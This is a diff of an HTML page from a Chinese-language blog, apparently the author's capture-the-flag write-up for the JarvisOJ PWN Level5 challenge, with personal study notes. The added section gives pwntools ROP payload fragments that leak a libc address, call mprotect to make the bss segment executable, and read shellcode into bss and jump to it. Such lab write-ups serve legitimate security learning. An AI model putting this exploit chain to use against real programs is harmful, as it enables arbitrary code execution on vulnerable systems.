@@ -64,7 +64,7 @@
 <meta property="og:site_name" content="5lyTher1n&#39;s Blog">
 <meta property="og:description" content="前言和level3_x64的文件是一样的，不同的地方在于，这里假设不让使用system函数和execve函数。 题目提示了可以用mmap或mprotect。 嗯，两个听都没听过的东西。。。 直接找题解吧つ﹏⊂ 前排提醒，文章记录很乱，大概率对别人没什么帮助。愿意看就点下面吧，做好右上角的准备">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-11-21T11:45:57.622Z">
+<meta property="og:updated_time" content="2019-11-22T15:50:17.770Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="JarvisOJ_PWN_Level5">
 <meta name="twitter:description" content="前言和level3_x64的文件是一样的，不同的地方在于，这里假设不让使用system函数和execve函数。 题目提示了可以用mmap或mprotect。 嗯，两个听都没听过的东西。。。 直接找题解吧つ﹏⊂ 前排提醒，文章记录很乱，大概率对别人没什么帮助。愿意看就点下面吧，做好右上角的准备">
@@ -285,11 +285,19 @@
                 
               
 
-              <time title="创建时间：2019-11-21 18:42:16 / 修改时间：19:45:57" itemprop="dateCreated datePublished" datetime="2019-11-21T18:42:16+08:00">2019-11-21</time>
+              <time title="创建时间：2019-11-21 18:42:16" itemprop="dateCreated datePublished" datetime="2019-11-21T18:42:16+08:00">2019-11-21</time>
             </span>
           
             
 
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-11-22 23:50:17" itemprop="dateModified" datetime="2019-11-22T23:50:17+08:00">2019-11-22</time>
+              </span>
             
           
             <span class="post-meta-item">
@@ -342,14 +350,28 @@
 <p>（<strong>以下感觉不太对，算是自己理解的，准确的还是应该查下网上的内容</strong>）*<br>mmap好像是使一段文件和内存建立连接，修改其中一个，另一个也会发生改变。*</p>
 <p><em>mprotect的话，好像是修改一段区间的权限。权限表示方式好像和chmod一样</em></p>
 <p>看的题解好像都是使用的mprotect。</p>
-<h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>和之前一样，先输出write在内存中的地址。然后计算出offset.这样可以使用libc.so里的内容。</p>
-<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>使用mprotect修改bss段的一段区间的权限，改为7.好像命令是以chmod的形式给出。</p>
-<h2 id="第二步-1"><a href="#第二步-1" class="headerlink" title="第二步"></a>第二步</h2><p>找到bss地址，把shellcode写入到bss地址里。然后ret到shellcode上，开始执行代码</p>
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>和之前一样，先输出write在内存中的地址。然后计算出offset.这样可以使用libc.so里的内容。<br><em>(11.22留)</em>和level3一样，利用两个gadget，先输出了write_got，这样可以计算出偏移量，然后，可以利用so文件里面的gadget。使用ROPgadget在so文件里搜索’pop|ret’可以发现，存在pop rdx。<br>这样可以直接通过构造三个gadget来实现三个参数及其以内的函数调用.</p>
+<pre><code>p1 = pad + p64(prdi) + p64(1)
+
+p1+= p64(prsi) + p64(write_got)
+
+p1+= &apos;1&apos; * 8 + p64(write_addr) + p64(addr_start)</code></pre><p>这里的addr_start可以是vulnerable_function的地址<br>也可以是_start的地址。后者是从一篇WP里看到的，好像是以main函数为参数的函数，是程序的入口函数。<br>但感觉加上测试，vulnerable_funct的地址也可以。</p>
+<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>使用mprotect修改bss段的一段区间的权限，改为7.好像命令是以chmod的形式给出。<br><em>（11.22留）</em><br>个人觉得先修改权限比较合适，看起来像是修改了大段的地址，但是只利用了其中一小部分，看了下自动生成的len(shellcode)=48</p>
+<pre><code>p2 = pad + p64(prdi) 
+p2+= p64(0x00600000) + p64(prsi) + p64(0x1000) + &apos;p2p2p2p2&apos;
+p2+= p64(prdx) + p64(7) + p64(libc_mpro)
+p2+= p64(addr_start)</code></pre><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>找到bss地址，把shellcode写入到bss地址里。然后ret到shellcode上，开始执行代码<br><em>11.22留:</em></p>
+<pre><code>p3 = pad + p64(prdi) + p64(0)
+p3+= p64(prsi) + p64(bss_addr+0x500) + &apos;deadbeef&apos; 
+p3+= p64(prdx) + p64(0x100)
+p3+= p64(e.symbols[&apos;read&apos;])
+p3+= p64(bss_addr + 0x500)</code></pre><p>用read函数，确定一段地址后把shellcode写入进去，然后在ret里，再跳回这段地址，就可以正常执行了。<br>这里比较需要注意的点应该是要设置产生64位的shellcode，之前32位的一直不成功。。。设置了context.binary或者context.arch后就可以了</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这应该是写的最少的一次报告。</p>
 <p>状态没那么好，真让我总结技术点，实在不知道总结些什么好。。。扯点场外：</p>
 <p>题目是上午上课时写的，中午和下午一直在调程序，主要之前写的程序都属于自娱自乐的玩具，真的要发挥些作用时就发现，问题不少。比如，我连使用异常处理的习惯都没有，导致程序报错时直接崩溃了。再或者程序运行着忽然就卡住不动了，可能和资源释放有关系、也可能和timeout有关，结果就一直在看着程序跑。。。事后感觉，好蠢哦0.0 。。。应该放着程序跑，然后设定异常时警告之类的方法，然后专心做别的事，让人来监视着程序跑几个小时，emmm，好蠢0.0</p>
+<p>【<em>11.22留</em><br>今天没做新题，昨天只是把这一题给大致流程学习了下，但是没有自己动手写。今天一个白天都在调乱七八糟的小程序，越发觉得大坑都是一步一步跳进去的0.0<br>晚上去上课觉得还是要动手把这题写下，顺便像昨天那样的程序实在不忍心看，今天再修改吧。。。<br>这题还有一种很巧妙的解法，是利用了一连串pop和call加jnz的。觉得也特别巧妙，之后有时间把这种解法补上来】</p>
 <p>有可能这篇报告会修改，但今天就先这样发着吧<del><em>美其名曰，真实的记录学习过程つ﹏⊂</em></del></p>
-<p><strong>人一我百，人十我万，永不放弃，加油！</strong></p>
+<p><strong>：人一我百，人十我万，永不放弃，加油！</strong></p>
 
     </div>
 
@@ -438,7 +460,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#题解"><span class="nav-number">2.</span> <span class="nav-text">题解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#第一步"><span class="nav-number">2.1.</span> <span class="nav-text">第一步</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二步"><span class="nav-number">2.2.</span> <span class="nav-text">第二步</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二步-1"><span class="nav-number">2.3.</span> <span class="nav-text">第二步</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#题解"><span class="nav-number">2.</span> <span class="nav-text">题解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#方法一"><span class="nav-number">2.1.</span> <span class="nav-text">方法一</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一步"><span class="nav-number">2.1.1.</span> <span class="nav-text">第一步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二步"><span class="nav-number">2.1.2.</span> <span class="nav-text">第二步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三步"><span class="nav-number">2.1.3.</span> <span class="nav-text">第三步</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
         
       </div>
       <!--/noindex-->
